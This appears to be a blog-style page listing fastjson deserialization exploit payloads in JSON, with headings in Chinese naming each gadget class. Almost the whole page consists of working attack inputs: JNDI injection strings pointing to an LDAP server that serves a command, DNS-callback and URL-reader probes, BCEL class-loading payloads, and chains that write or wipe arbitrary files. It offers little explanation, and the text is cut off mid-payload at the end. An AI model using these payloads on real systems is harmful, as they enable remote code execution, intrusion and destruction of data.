<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap:aced000...6f;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JndiRefForwardingDataSource</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loginTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>InetAddress</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.InetAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>Inet6Address</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>URL</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JSONObject</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>URLReader</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;poc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:9999&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>AutoCloseable 任意文件写入</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/target&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filecontent&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>BasicDataSource</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span> <span class="punctuation">:</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JndiConverter</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AsText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JtaTransactionConfig</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JndiObjectFactory</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>AnterosDBCPConfig</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>AnterosDBCPConfig2</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>CacheJndiTmLookup</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>AutoCloseable 清空指定文件</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>AutoCloseable 清空指定文件</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>AutoCloseable 任意文件写入</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.solr.common.util.FastOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tempBuffer&quot;</span><span class="punctuation">:</span><span class="string">&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sink&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">38</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;close&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.iq80.snappy.SnappyOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>AutoCloseable MarshalOutputStream 任意文件写入</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;@type&#x27;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &#x27;@type&#x27;: &#x27;sun.rmi.server.MarshalOutputStream&#x27;,</span><br><span class="line">    &#x27;out&#x27;: &#123;</span><br><span class="line">        &#x27;@type&#x27;: &#x27;java.util.zip.InflaterOutputStream&#x27;,</span><br><span class="line">        &#x27;out&#x27;: &#123;</span><br><span class="line">            &#x27;@type&#x27;: &#x27;java.io.FileOutputStream&#x27;,</span><br><span class="line">            &#x27;file&#x27;: &#x27;dst&#x27;,</span><br><span class="line">            &#x27;append&#x27;: false</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;infl&#x27;: &#123;</span><br><span class="line">            &#x27;input&#x27;: &#123;</span><br><span class="line">                &#x27;array&#x27;: &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;,</span><br><span class="line">                &#x27;limit&#x27;: 22</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;bufLen&#x27;: 1048576</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;protocolVersion&#x27;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>BasicDataSource</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>HikariConfig</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>HikariConfig</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>HikariConfig</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>HikariConfig</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>SessionBeanProvider</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JMSContentInterceptor</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>ContextClassLoaderSwitcher</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;contextClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span 